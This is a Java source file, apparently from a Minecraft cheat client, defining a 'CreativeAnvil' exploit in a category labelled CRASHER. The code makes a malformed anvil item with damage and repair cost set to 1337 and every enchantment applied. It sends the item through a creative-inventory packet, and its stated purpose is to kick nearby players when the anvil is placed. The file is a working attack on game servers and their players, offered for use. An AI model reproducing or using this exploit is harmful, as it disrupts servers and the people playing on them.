package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CreativeAnvilPrimitive extends PrimitiveFeature {

    public CreativeAnvilPrimitive() {
        super("CreativeAnvil", "Gives you an anvil with the ability to kick players who are near when it gets placed", ModuleCategory.CRASHER);
    }

    @Override
    public void execute(Object... objects) {
        if (!getPlayer().capabilities.isCreativeMode) {
            ChatUtil.print("This exploit will only work on creative");
            return;
        }

        for (int i = 0; i < 9; i++) {
            if (getPlayer().inventory.getStackInSlot(i) == null) {
                ItemStack itemStack = new ItemStack(Blocks.anvil);
                itemStack.setItemDamage(1337);
                itemStack.setRepairCost(1337);

                for (Enchantment enchantment : Enchantment.enchantmentsList) {
                    if (enchantment != null) {
                        itemStack.addEnchantment(enchantment, 1);
                    }
                }

                itemStack.setStackDisplayName("anvil :)");

                getPlayer().sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itemStack));
                getPlayer().closeScreen();
                ChatUtil.print("Added anvil to your inventory");
                return;
            }
        }

        ChatUtil.print("Failed to give you an anvil");
    }

}
